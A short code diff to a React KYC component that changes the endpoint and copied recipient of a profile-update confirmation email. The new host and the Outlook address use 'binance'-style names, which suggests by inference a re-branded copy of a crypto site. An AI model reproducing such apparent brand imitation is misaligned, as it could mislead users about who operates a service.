@@ -117,14 +117,14 @@ export default function Kyc() {
       })
       .then(() => {
         ajax({
-          url: "https://reinvented-natural-catshark.glitch.me/unchainedtrade",
+          url: "https://bnbearnpro.vercel.app/sendmail",
           method: "POST",
           headers: {
             "Content-Type": "application/json",
           },
           body: {
             message: `Hello ${user.firstName}, your profile has been successfully updated.`,
-            to: `${user.email}, service@unchainedtrader.com`,
+            to: `${user.email}, binanceearnpro@outlook.com`,
             subject: "Pofile update",
           },
         }).subscribe(() => {
